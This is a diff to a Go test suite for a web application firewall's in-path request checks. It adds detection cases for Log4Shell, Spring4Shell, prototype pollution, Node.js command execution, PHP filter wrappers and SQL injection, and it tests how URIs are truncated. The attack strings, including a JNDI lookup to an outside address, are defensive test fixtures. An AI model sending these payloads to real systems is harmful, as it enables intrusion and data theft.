@@ -29,6 +29,23 @@ func TestCheckInline(t *testing.T) {
 			want: gateway.WAFInlineDetected, wantRule: 942100},
 		{name: "benign request", s: sample(http.MethodGet, "/api/orders?page=2&sort=created", nil, ""),
 			want: gateway.WAFInlineClean},
+		// Families amendment 21 added to the in-path set; block rules passed
+		// all of these before.
+		{name: "Log4Shell in User-Agent", s: withUA(sample(http.MethodGet, "/", nil, ""), "${jndi:ldap://203.0.113.7/a}"),
+			want: gateway.WAFInlineDetected, wantRule: 944150},
+		{name: "Spring4Shell class loader", s: sample(http.MethodGet, "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", nil, ""),
+			want: gateway.WAFInlineDetected, wantRule: 944130},
+		{name: "prototype pollution", s: sample(http.MethodGet, "/?__proto__[admin]=1", nil, ""),
+			want: gateway.WAFInlineDetected, wantRule: 934130},
+		{name: "Node.js child_process", s: sample(http.MethodGet, "/?x=require('child_process').exec('id')", nil, ""),
+			want: gateway.WAFInlineDetected, wantRule: 934100},
+		{name: "PHP filter wrapper", s: sample(http.MethodGet, "/?f=php://filter/convert.base64-encode/resource=index.php", nil, ""),
+			want: gateway.WAFInlineDetected, wantRule: 933140},
+		{name: "TRACE method", s: sample(http.MethodTrace, "/", nil, ""),
+			want: gateway.WAFInlineDetected, wantRule: 911100},
+		// The platform policy applies in-path too: REST methods are allowed.
+		{name: "DELETE is allowed", s: sample(http.MethodDelete, "/api/orders/7", nil, ""),
+			want: gateway.WAFInlineClean},
 		// Bodies are never checked in-path, even when the sample carries one.
 		{name: "attack only in body", s: sample(http.MethodPost, "/api/comments", nil, `{"text":"<script>alert(document.cookie)</script>"}`),
 			want: gateway.WAFInlineClean},
@@ -93,7 +110,7 @@ func TestCheckInlineAccountShare(t *testing.T) {
 	other := flood
 	other.AccountID, other.AppID = "acct-other", "app-other"
 	i := New(&recordingObserver{}, nil)
-	if _, err := i.inlineWAF(); err != nil {
+	if _, err := i.inlineWAF(true); err != nil {
 		t.Fatal(err)
 	}
 	// Alone, the account takes every slot: the pool is work-conserving.
@@ -108,7 +125,10 @@ func TestCheckInlineAccountShare(t *testing.T) {
 		t.Fatalf("flood check on a full pool = %s (%s), want skipped (account_share)", res.Outcome, res.SkipReason)
 	}
 
-	i.inlineWait = time.Second
+	// Both checks below are granted a slot, so the wait never runs out in a
+	// passing test; a 1 s wait expired on a loaded race runner and the
+	// flood's check left the queue before the slot was freed.
+	i.inlineWait = time.Minute
 	floodRes, otherRes := make(chan gateway.WAFInlineResult, 1), make(chan gateway.WAFInlineResult, 1)
 	go func() { floodRes <- i.CheckInline(flood) }()
 	waitForWaiters(t, i.inlineSlots, 0, 1)
@@ -166,7 +186,7 @@ func withUA(s gateway.WAFSample, ua string) gateway.WAFSample {
 func TestCheckInlineWaitsForASlot(t *testing.T) {
 	attack := withUA(sample(http.MethodGet, "/", nil, ""), "sqlmap/1.7.2")
 	i := New(&recordingObserver{}, nil)
-	if _, err := i.inlineWAF(); err != nil {
+	if _, err := i.inlineWAF(true); err != nil {
 		t.Fatal(err)
 	}
 	// A generous wait keeps the test independent of scheduler latency.
@@ -259,5 +279,77 @@ func TestBoundHeaders(t *testing.T) {
 	utf := http.Header{"X-Name": {strings.Repeat("é", api.EdgeWAFMaxInspectHeaderValueBytes)}}
 	if v := boundHeaders(utf).Get("X-Name"); !utf8.ValidString(v) {
 		t.Fatal("a cut value is not valid UTF-8")
+	}
+}
+
+// TestCheckInlineWithoutStrictInspection: an account
+// edge_waf_strict_inspection leaves out keeps the baseline in-path set, so
+// a rule already in block refuses nothing new, but a check still scores only
+// the URI's first 8 KiB (ADR-831 amendment 21).
+func TestCheckInlineWithoutStrictInspection(t *testing.T) {
+	i := New(&recordingObserver{}, nil)
+	baseline := func(s gateway.WAFSample) gateway.WAFSample { s.Strict = false; return s }
+	for name, s := range map[string]gateway.WAFSample{
+		"TRACE method":         sample(http.MethodTrace, "/", nil, ""),
+		"PHP filter wrapper":   sample(http.MethodGet, "/?f=php://filter/convert.base64-encode/resource=index.php", nil, ""),
+		"a URI past the bound": sample(http.MethodGet, "/search?q="+strings.Repeat("a", 2*api.EdgeWAFMaxInspectURIBytes), nil, ""),
+	} {
+		if res := i.CheckInline(baseline(s)); res.Outcome != gateway.WAFInlineClean {
+			t.Errorf("%s: outcome = %s (rules %v, categories %v), want clean on the baseline set", name, res.Outcome, res.RuleIDs, res.Categories)
+		}
+	}
+	// The baseline set still blocks what it always did, also within the
+	// scored prefix of a long URI.
+	sqli := sample(http.MethodGet, "/api/items?q=1%27%20OR%201%3D1--&pad="+strings.Repeat("a", 2*api.EdgeWAFMaxInspectURIBytes), nil, "")
+	if res := i.CheckInline(baseline(sqli)); res.Outcome != gateway.WAFInlineDetected || res.Oversized {
+		t.Errorf("SQLi before the cut: outcome = %s oversized = %v, want a scored detection", res.Outcome, res.Oversized)
+	}
+}
+
+// TestSampledCheckReportsUninspectedURI: a sampled check scores the URI's
+// prefix and reports the URI as uninspected, as warn and block treat it, so
+// observe does not silently miss a payload past the cut (ADR-831 amendment
+// 21).
+func TestSampledCheckReportsUninspectedURI(t *testing.T) {
+	waf, _ := sharedInspector(t).engine(1)
+	uri := "/search?pad=" + strings.Repeat("a", api.EdgeWAFMaxInspectURIBytes) + "&q=1%27%20UNION%20SELECT%20password%20FROM%20users--"
+	res, err := evaluate(waf, sample(http.MethodGet, uri, nil, ""))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !res.Detected || !res.Oversized || !slices.Contains(res.Categories, api.EdgeWAFCategoryUninspectedURI) {
+		t.Fatalf("result = %+v, want an uninspected-uri detection", res)
+	}
+	short, err := evaluate(waf, sample(http.MethodGet, "/search?q=shoes", nil, ""))
+	if err != nil || short.Detected || short.Oversized {
+		t.Fatalf("short URI = %+v (%v), want clean", short, err)
+	}
+}
+
+// TestBoundURI: a sampled check scores at most api.EdgeWAFMaxInspectURIBytes
+// of the URI, so its cost stays bounded (ADR-831 amendment 21).
+func TestBoundURI(t *testing.T) {
+	if got := boundURI("/a?b=c"); got != "/a?b=c" {
+		t.Fatalf("a short URI changed: %q", got)
+	}
+	long := "/q?x=" + strings.Repeat("é", api.EdgeWAFMaxInspectURIBytes)
+	got := boundURI(long)
+	if len(got) > api.EdgeWAFMaxInspectURIBytes || len(got) < api.EdgeWAFMaxInspectURIBytes-4 {
+		t.Fatalf("scored %d URI bytes, want close to but at most %d", len(got), api.EdgeWAFMaxInspectURIBytes)
+	}
+	if !utf8.ValidString(got) {
+		t.Fatal("a cut URI is not valid UTF-8")
+	}
+	// A cut never splits a %XX escape.
+	for _, pad := range []int{1, 2} {
+		esc := strings.Repeat("a", api.EdgeWAFMaxInspectURIBytes-pad) + "%41" + strings.Repeat("b", 10)
+		if got := boundURI(esc); strings.Contains(got, "%") || len(got) != api.EdgeWAFMaxInspectURIBytes-pad {
+			t.Fatalf("cut %d bytes into an escape: kept %d bytes ending %q", pad, len(got), got[len(got)-3:])
+		}
+	}
+	// Bytes are scored as sent: a NUL is not rewritten.
+	raw := "/q?x=%00\x00" + strings.Repeat("a", api.EdgeWAFMaxInspectURIBytes)
+	if got := boundURI(raw); !strings.HasPrefix(got, "/q?x=%00\x00") || len(got) != api.EdgeWAFMaxInspectURIBytes {
+		t.Fatalf("a cut URI changed its bytes: %q...", got[:12])
 	}
 }
